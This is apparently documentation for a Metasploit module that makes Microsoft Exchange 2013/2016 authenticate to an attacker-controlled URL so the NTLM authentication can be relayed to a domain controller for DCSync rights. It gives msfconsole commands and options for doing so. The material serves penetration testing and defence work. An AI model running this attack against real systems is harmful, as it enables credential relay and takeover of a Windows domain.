## Vulnerable Application

  * Microsoft Exchange 2013 and 2016
  * Tested on Exchange 2016
  * Usage:
    * Download and install Exchange Server within a Windows domain
    * Setup a mailbox with a domain user
    * Run the module
    * Relay the NTLM authentication to the DC

## Verification Steps

  Example steps:

  1. Start msfconsole
  2. Do: ```use auxiliary/scanner/http/exchange_web_server_pushsubscription```
  3. Do: ```set attacker_url <url>```
  4. Do: ```set rport <target_port>```
  5. Do: ```set rhost <target_IP>```
  6. Do: ```set domain <domain_name>```
  7. Do: ```set password <user_pass>```
  8. Do: ```set username <user_pass>```
  9. Do: ```run```

## Options

  **The ATTACKER_URL option**

  This option should contain a URL under the attacker's control. This is where the Exchange will try to authenticate.

  **The PASSWORD option**
  This can be either the password or the NTLM hash of any domain user with a mailbox configured on Exchange.

## Scenarios

  This module can be used to make a request to the Exchange server and force it to authenticate to a URL under our control. 
  An example scenario is that when this module is combined with an NTLM relay attack, if the Exchange server has the necessary permissions it is possible to grant us DCSync rights.
